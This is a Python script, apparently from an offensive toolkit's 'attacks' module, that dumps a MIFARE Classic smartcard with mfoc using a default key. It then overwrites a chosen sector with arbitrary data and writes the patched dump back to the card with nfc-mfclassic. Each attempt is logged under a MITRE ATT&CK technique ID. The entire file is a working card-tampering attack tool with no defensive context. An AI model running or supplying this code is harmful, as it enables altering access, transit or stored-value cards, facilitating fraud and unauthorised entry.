#!/usr/bin/env python3
# modules/attacks/ic_card_overwriter.py

import subprocess
import argparse
import os
from datetime import datetime
import json

LOG = "results/ic_card_overwrite_log.json"
MITRE_TTP = "T1556.004"

def log_event(uid, sector, status):
    os.makedirs("results", exist_ok=True)
    event = {
        "timestamp": datetime.utcnow().isoformat(),
        "target_uid": uid,
        "sector": sector,
        "status": status,
        "ttp": MITRE_TTP
    }
    with open(LOG, "a") as f:
        f.write(json.dumps(event) + "\n")

def overwrite_sector(uid, sector, data, key='FFFFFFFFFFFF'):
    try:
        cmd = [
            "mfoc", "-O", "dump.mfd", "-k", key
        ]
        subprocess.run(cmd, check=True)
        # Patch logic here (edit dump.mfd) — sample demo patch
        patched = "patched.mfd"
        with open("dump.mfd", "rb") as f:
            content = bytearray(f.read())
        content[int(sector)*16:int(sector)*16+len(data)] = data.encode()
        with open(patched, "wb") as f:
            f.write(content)

        subprocess.run(["nfc-mfclassic", "W", "a", patched], check=True)
        log_event(uid, sector, "success")
        print(f"[✓] Sector {sector} overwritten for UID {uid}")
    except Exception as e:
        log_event(uid, sector, f"error: {e}")
        print(f"[!] Failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Overwrite IC smartcards with custom sector data")
    parser.add_argument("--uid", required=True, help="Target card UID")
    parser.add_argument("--sector", required=True, type=int, help="Target sector to overwrite")
    parser.add_argument("--data", required=True, help="16 bytes of data to write")
    args = parser.parse_args()

    overwrite_sector(args.uid, args.sector, args.data)
